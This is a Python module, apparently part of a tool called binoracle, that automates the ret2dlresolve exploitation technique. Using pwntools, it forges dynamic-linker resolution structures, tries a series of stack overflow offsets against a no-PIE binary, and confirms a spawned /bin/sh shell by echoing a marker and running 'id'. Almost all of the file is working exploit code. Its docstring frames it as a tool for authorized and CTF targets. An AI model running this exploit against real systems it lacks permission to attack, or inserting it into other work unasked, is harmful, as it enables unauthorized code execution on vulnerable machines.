"""ret2dlresolve: pop a shell on a dynamic, no-PIE binary with NO libc leak and NO gift.

When a binary has a stack overflow but no win(), no system() in it, and no way to leak a libc
address, you can still get a shell by forging the dynamic linker's lazy-resolution structures
(Elf64_Rela + Elf64_Sym + the symbol string) in a writable region and calling the PLT-0 resolver
stub with a crafted relocation index, so the linker resolves and calls system("/bin/sh") for you --
no leak required. pwntools builds the forged structures (`Ret2dlresolvePayload`).

Preconditions binoracle reasons about: dynamic ELF, no-PIE (fixed addresses), **Partial RELRO**
(Full RELRO / BIND_NOW resolves everything at load and removes the lazy path -> kills it), an
overflow with enough ROP gadgets to call `read(0, data_addr)`, and no simpler technique available.

Platform note: glibc >= 2.35 hardened `_dl_fixup` (bounds-checks the relocation/symbol index), so
the classic forged-index payload FAILS there -- it still works against the older libc that many CTF
challenges ship with. binoracle verifies by execution and degrades honestly: it never claims a
shell it did not get. For AUTHORIZED / CTF targets. Runs in the shared sandbox (Docker or native)."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, ROP, Ret2dlresolvePayload, flat, process, context
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"
# Preconditions: dynamic + no-PIE + not Full RELRO. (Full RELRO removes the lazy-resolution path.)
if elf.pie or elf.statically_linked or str(getattr(elf, "relro", "")).lower() == "full":
    print("NOT_APPLICABLE (needs dynamic, no-PIE, not Full RELRO)"); sys.exit(1)
try:
    ret = ROP(elf).find_gadget(["ret"]).address
except Exception:
    ret = None
MARK = b"BINORACLE_DLR_PWNED"
# Try the common return-address offsets; for each, build read(0,data)->ret2dlresolve, optionally
# with a `ret` for 16-byte stack alignment before the resolver calls system (movaps).
for off in [72, 64, 88, 56, 96, 80, 104, 120, 40, 48, 112, 128, 136, 152, 168, 200]:
    for align in ((False, True) if ret else (False,)):
        io = None
        try:
            io = process([name])
            try: io.recvrepeat(0.2)
            except Exception: pass
            rop = ROP(elf)
            dl = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
            rop.read(0, dl.data_addr, len(dl.payload))     # explicit count -> sets rdx
            if align: rop.raw(ret)
            rop.ret2dlresolve(dl)
            io.send(flat({off: rop.chain()})); time.sleep(0.25)
            io.send(dl.payload); time.sleep(0.25)
            io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
            out = b""
            try: out = io.recvrepeat(1.2)
            except Exception: pass
            io.close()
            if MARK in out or b"uid=" in out:
                print("VERIFIED off=%d align=%s data=%#x" % (off, "ret" if align else "none", dl.data_addr))
                sys.exit(0)
        except Exception:
            try:
                if io: io.close()
            except Exception: pass
print("NOT_VERIFIED")
sys.exit(1)
'''


def autodlresolve(binary: str) -> dict:
    """ret2dlresolve (shell sin leak de libc), verificado por ejecucion; degrada honestamente
    cuando no aplica o cuando glibc >= 2.35 endurece el resolver. Docker o sandbox nativo."""
    res = run_driver(binary, _DRIVER, ".binoracle_dlr.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"ret2dlresolve: shell verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"ret2dlresolve: no verificado ({eng}) (no aplicable, sin gadgets, "
                        "o resolver endurecido en glibc >= 2.35)")
    return res


def render_dlresolve(r: dict) -> str:
    out = ["## Auto ret2dlresolve (shell sin leak, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
